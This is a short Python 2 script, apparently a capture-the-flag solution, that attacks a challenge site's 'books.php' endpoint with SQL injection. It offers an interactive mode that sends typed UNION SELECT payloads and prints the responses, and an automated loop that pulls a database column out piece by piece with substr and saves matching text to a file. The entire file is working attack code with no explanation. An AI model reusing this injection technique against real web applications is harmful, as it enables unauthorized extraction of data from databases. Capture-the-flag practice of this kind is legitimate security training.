import requests
import sys

url = 'https://poems.asisctf.com/books.php?type=excerpt&id='
qrs = []

ch = ''
flag_live = False

if len(sys.argv) > 1:
    flag_live = sys.argv[1] == '-live'

if flag_live:
    while ch != 'y':
        qr = raw_input('>')
        #payload = '4\' {} -- \''.format(qr)
        payload = '4\' union select \'{}\' -- \''.format(qr)
        print 'payload: ' + payload
        res = requests.get(url+payload)
        print res.text

        ans = raw_input('save query?:')
        if ans == 'y':
            strs = ans
            strs += '----------------------------\n' 
            strs += res.text + '\n'
            strs += '=============================\n'
            qrs.append(strs) 
        ch = raw_input('exit the program?:')

    for x in qrs:
        print x

len_max = 1000
cur = 0

f = open('bk', 'w')
import re
while cur < len_max:
    payload = '4\' union select substr(info, 1, {}) from books limit 0, 1 -- \''.format(cur)
    print '======================================================================'
    print 'payload: ' + payload
    print '======================================================================'
    print 'Receive response data...'
    res = requests.get(url + payload)
    pt = re.compile('in tag [a-zA-Z0-9]+')
    mt = pt.findall(res.text)
    if len(mt) > 0:
        print 'len: ' + str(len(mt))
        f.write(mt[0] + '\n')
        print 'Found!!'
        print 'Found!!'
        print 'Found!!'
        print '['+mt[0]+']'
    cur += 1
f.close()

    

